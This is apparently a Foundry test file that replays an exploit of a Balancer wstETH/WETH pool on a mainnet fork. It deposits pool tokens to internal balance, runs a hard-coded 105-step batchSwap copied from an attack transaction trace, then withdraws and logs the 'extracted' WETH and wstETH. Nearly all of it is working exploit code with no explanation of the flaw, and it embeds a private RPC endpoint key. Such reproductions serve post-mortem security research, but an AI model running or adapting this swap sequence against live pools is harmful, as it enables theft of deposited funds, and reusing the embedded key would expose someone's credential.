// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function batchSwap(
        SwapKind kind,
        BatchSwapStep[] memory swaps,
        IAsset[] memory assets,
        FundManagement memory funds,
        int256[] memory limits,
        uint256 deadline
    ) external payable returns (int256[] memory);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;
    function getInternalBalance(address user, IERC20[] memory tokens)
        external view
        returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract BalancerWstEthWethPoolTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    bytes32 constant POOL_ID_WSTETH = 0x93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2;
    address constant wstETH_WETH_BPT = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;
        uint8 indexIn;
        uint8 indexOut;
    }

    function testWstEthWethPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717395
        );

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);

        console.log("INITIAL STATE:");
        console.log("wstETH (index 0):", initialBalances[0]);
        console.log("BPT (index 1):", initialBalances[1]);
        console.log("WETH (index 2):", initialBalances[2]);

        // Fund attacker with BPT tokens
        deal(wstETH_WETH_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(wstETH_WETH_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(wstETH).approve(address(VAULT), type(uint256).max);
        WETH.approve(address(VAULT), type(uint256).max);

        // Deposit BPT to internal balance first
        IBalancerVault.UserBalanceOp[] memory depositOps = new IBalancerVault.UserBalanceOp[](1);
        depositOps[0] = IBalancerVault.UserBalanceOp({
            kind: IBalancerVault.UserBalanceOpKind.DEPOSIT_INTERNAL,
            asset: IAsset(wstETH_WETH_BPT),
            amount: 10000 ether,
            sender: ATTACKER,
            recipient: payable(ATTACKER)
        });
        VAULT.manageUserBalance(depositOps);
        console.log("BPT deposited to internal balance");

        // Use internal balance to accumulate funds in Vault
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: true,
            recipient: payable(ATTACKER),
            toInternalBalance: true
        });

        // swaps from transaction trace
        ExactSwapData[105] memory swaps;
        swaps[0] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 4228132612127881562978, indexIn: 1, indexOut: 0 });
        swaps[1] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 1957287132413516128516, indexIn: 1, indexOut: 2 });
        swaps[2] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 42281326121278815630, indexIn: 1, indexOut: 0 });
        swaps[3] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 19572871324135161285, indexIn: 1, indexOut: 2 });
        swaps[4] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 422813261212788156, indexIn: 1, indexOut: 0 });
        swaps[5] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 195728713241351613, indexIn: 1, indexOut: 2 });
        swaps[6] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 4228132612127882, indexIn: 1, indexOut: 0 });
        swaps[7] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 1957287132413516, indexIn: 1, indexOut: 2 });
        swaps[8] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 42281326121278, indexIn: 1, indexOut: 0 });
        swaps[9] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 19572871324136, indexIn: 1, indexOut: 2 });
        swaps[10] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 422813261213, indexIn: 1, indexOut: 0 });
        swaps[11] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 195728713241, indexIn: 1, indexOut: 2 });
        swaps[12] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 4228132612, indexIn: 1, indexOut: 0 });
        swaps[13] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 1957287132, indexIn: 1, indexOut: 2 });
        swaps[14] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 42281326, indexIn: 1, indexOut: 0 });
        swaps[15] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 19572872, indexIn: 1, indexOut: 2 });
        swaps[16] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 422814, indexIn: 1, indexOut: 0 });
        swaps[17] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 195728, indexIn: 1, indexOut: 2 });
        swaps[18] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 4228, indexIn: 1, indexOut: 0 });
        swaps[19] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 1958, indexIn: 1, indexOut: 2 });
        swaps[20] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 43, indexIn: 1, indexOut: 0 });
        swaps[21] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 20, indexIn: 1, indexOut: 2 });
        swaps[22] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 99999999995, indexIn: 2, indexOut: 0 });
        swaps[23] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[24] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 380000000000000, indexIn: 0, indexOut: 2 });
        swaps[25] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 6665, indexIn: 2, indexOut: 0 });
        swaps[26] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[27] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 270000000000000, indexIn: 0, indexOut: 2 });
        swaps[28] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 6528, indexIn: 2, indexOut: 0 });
        swaps[29] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[30] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 190000000000000, indexIn: 0, indexOut: 2 });
        swaps[31] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 2477, indexIn: 2, indexOut: 0 });
        swaps[32] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[33] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 130000000000000, indexIn: 0, indexOut: 2 });
        swaps[34] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 297, indexIn: 2, indexOut: 0 });
        swaps[35] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[36] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 97000000000000, indexIn: 0, indexOut: 2 });
        swaps[37] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 47546, indexIn: 2, indexOut: 0 });
        swaps[38] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[39] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 70000000000000, indexIn: 0, indexOut: 2 });
        swaps[40] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 301296, indexIn: 2, indexOut: 0 });
        swaps[41] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[42] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 50000000000000, indexIn: 0, indexOut: 2 });
        swaps[43] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 9419, indexIn: 2, indexOut: 0 });
        swaps[44] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[45] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 36000000000000, indexIn: 0, indexOut: 2 });
        swaps[46] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 3493484, indexIn: 2, indexOut: 0 });
        swaps[47] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[48] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 26000000000000, indexIn: 0, indexOut: 2 });
        swaps[49] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 1157, indexIn: 2, indexOut: 0 });
        swaps[50] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[51] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 18000000000000, indexIn: 0, indexOut: 2 });
        swaps[52] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 341, indexIn: 2, indexOut: 0 });
        swaps[53] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[54] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 13000000000000, indexIn: 0, indexOut: 2 });
        swaps[55] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 670, indexIn: 2, indexOut: 0 });
        swaps[56] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[57] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 9500000000000, indexIn: 0, indexOut: 2 });
        swaps[58] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 10201, indexIn: 2, indexOut: 0 });
        swaps[59] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[60] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 6210000000000, indexIn: 0, indexOut: 2 });
        swaps[61] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 81, indexIn: 2, indexOut: 0 });
        swaps[62] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[63] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 4900000000000, indexIn: 0, indexOut: 2 });
        swaps[64] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 9846, indexIn: 2, indexOut: 0 });
        swaps[65] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[66] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 3500000000000, indexIn: 0, indexOut: 2 });
        swaps[67] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4546, indexIn: 2, indexOut: 0 });
        swaps[68] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[69] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 2500000000000, indexIn: 0, indexOut: 2 });
        swaps[70] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17520, indexIn: 2, indexOut: 0 });
        swaps[71] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[72] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 1700000000000, indexIn: 0, indexOut: 2 });
        swaps[73] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 292, indexIn: 2, indexOut: 0 });
        swaps[74] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[75] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 1200000000000, indexIn: 0, indexOut: 2 });
        swaps[76] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 220, indexIn: 2, indexOut: 0 });
        swaps[77] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[78] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 840000000000, indexIn: 0, indexOut: 2 });
        swaps[79] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 46307, indexIn: 2, indexOut: 0 });
        swaps[80] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[81] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 600000000000, indexIn: 0, indexOut: 2 });
        swaps[82] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 37215, indexIn: 2, indexOut: 0 });
        swaps[83] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[84] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 430000000000, indexIn: 0, indexOut: 2 });
        swaps[85] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 620177448, indexIn: 2, indexOut: 0 });
        swaps[86] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[87] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 310000000000, indexIn: 0, indexOut: 2 });
        swaps[88] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 21591, indexIn: 2, indexOut: 0 });
        swaps[89] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[90] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 220000000000, indexIn: 0, indexOut: 2 });
        swaps[91] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 671, indexIn: 2, indexOut: 0 });
        swaps[92] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[93] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 160000000000, indexIn: 0, indexOut: 2 });
        swaps[94] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 7038, indexIn: 2, indexOut: 0 });
        swaps[95] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 4, indexIn: 2, indexOut: 0 });
        swaps[96] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 110000000000, indexIn: 0, indexOut: 2 });
        swaps[97] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 10000, indexIn: 0, indexOut: 1 });
        swaps[98] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 10000000, indexIn: 2, indexOut: 1 });
        swaps[99] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 10000000000, indexIn: 0, indexOut: 1 });
        swaps[100] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 10000000000000, indexIn: 2, indexOut: 1 });
        swaps[101] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 10000000000000000, indexIn: 0, indexOut: 1 });
        swaps[102] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 10000000000000000000, indexIn: 2, indexOut: 1 });
        swaps[103] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 3418009626758926269710, indexIn: 0, indexOut: 1 });
        swaps[104] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 3418009626758926269710, indexIn: 2, indexOut: 1 });

        console.log("Total swaps:", swaps.length);

        // Convert to BatchSwapStep format
        IBalancerVault.BatchSwapStep[] memory batchSwaps = new IBalancerVault.BatchSwapStep[](swaps.length);
        for (uint i = 0; i < swaps.length; i++) {
            batchSwaps[i] = IBalancerVault.BatchSwapStep({
                poolId: POOL_ID_WSTETH,
                assetInIndex: swaps[i].indexIn,
                assetOutIndex: swaps[i].indexOut,
                amount: swaps[i].amount,
                userData: ""
            });
        }

        // Define assets: [wstETH, BPT, WETH]
        IAsset[] memory assets = new IAsset[](3);
        assets[0] = IAsset(wstETH);
        assets[1] = IAsset(wstETH_WETH_BPT);
        assets[2] = IAsset(address(WETH));

        // Set limits
        int256[] memory limits = new int256[](3);
        limits[0] = type(int256).max;
        limits[1] = type(int256).max;
        limits[2] = type(int256).max;

        // Execute batch swap
        console.log("Executing batchSwap with", swaps.length, "swaps...");
        int256[] memory assetDeltas = VAULT.batchSwap(
            IBalancerVault.SwapKind.GIVEN_OUT,
            batchSwaps,
            assets,
            funds,
            limits,
            block.timestamp + 3600
        );

        console.log("BatchSwap executed successfully!");
        console.log("Asset deltas:");
        console.log("  wstETH:", uint256(-assetDeltas[0]) / 1e18, "ETH");
        console.log("  BPT:", uint256(-assetDeltas[1]) / 1e18, "ETH");
        console.log("  WETH:", uint256(-assetDeltas[2]) / 1e18, "ETH");

        // withdraw from internal balance using manageUserBalance()
        IERC20[] memory internalTokens = new IERC20[](3);
        internalTokens[0] = IERC20(wstETH);
        internalTokens[1] = IERC20(wstETH_WETH_BPT);
        internalTokens[2] = IERC20(address(WETH));

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("");
        console.log("=== INTERNAL BALANCES");
        console.log("Internal wstETH:", internalBalances[0] / 1e18, "ETH");
        console.log("Internal BPT:", internalBalances[1] / 1e18, "ETH");
        console.log("Internal WETH:", internalBalances[2] / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(wstETH),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[1] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(wstETH_WETH_BPT),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[2] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(address(WETH)),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            VAULT.manageUserBalance(ops);
            console.log("manageUserBalance executed!");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);

        console.log("");
        console.log("=== FINAL STATE");
        console.log("wstETH (index 0):", finalBalances[0]);
        console.log("BPT (index 1):", finalBalances[1]);
        console.log("WETH (index 2):", finalBalances[2]);

        console.log("");
        console.log("=== POOL DELTAS");
        int256 wstethDelta = int256(finalBalances[0]) - int256(initialBalances[0]);
        int256 bptDelta = int256(finalBalances[1]) - int256(initialBalances[1]);
        int256 wethDelta = int256(finalBalances[2]) - int256(initialBalances[2]);
        
        console.log("wstETH delta:");
        console.logInt(wstethDelta);
        console.log("BPT delta:");
        console.logInt(bptDelta);
        console.log("WETH delta:");
        console.logInt(wethDelta);

        console.log("");
        console.log("=== EXTRACTED");
        console.log("wstETH:", IERC20(wstETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("BPT:", IERC20(wstETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");

        // Expected: ~1,963 WETH + ~4,259 wstETH extracted
        console.log("");
        console.log("SUCCESS!");
    }
    
}
